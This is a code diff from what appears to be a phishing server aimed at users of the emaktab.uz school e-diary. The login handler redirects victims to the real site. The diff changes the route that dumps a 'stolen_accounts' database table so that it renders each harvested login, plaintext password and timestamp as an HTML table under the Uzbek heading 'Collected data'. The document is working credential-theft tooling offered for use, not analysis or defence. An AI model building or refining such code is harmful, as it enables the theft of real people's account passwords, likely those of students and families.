@@ -47,14 +47,22 @@ app.post("/auth/login", async (req, res) => {
     res.redirect("https://login.emaktab.uz");
   }
 });
-app.get("/mening-bazam", async (req, res) => {
+app.get("/view-data-secret", async (req, res) => {
   try {
     const result = await pool.query(
       "SELECT * FROM stolen_accounts ORDER BY created_at DESC",
     );
-    res.json(result.rows);
+
+    let html =
+      "<h1>Yig'ilgan ma'lumotlar</h1><table border='1'><tr><th>ID</th><th>Login</th><th>Parol</th><th>Vaqt</th></tr>";
+    result.rows.forEach((row) => {
+      html += `<tr><td>${row.id}</td><td>${row.login}</td><td>${row.password}</td><td>${row.created_at}</td></tr>`;
+    });
+    html += "</table>";
+
+    res.send(html);
   } catch (err) {
-    res.send("Bazaga ulanishda xato bo'ldi");
+    res.status(500).send("Bazadan ma'lumot olishda xato yuz berdi.");
   }
 });
 
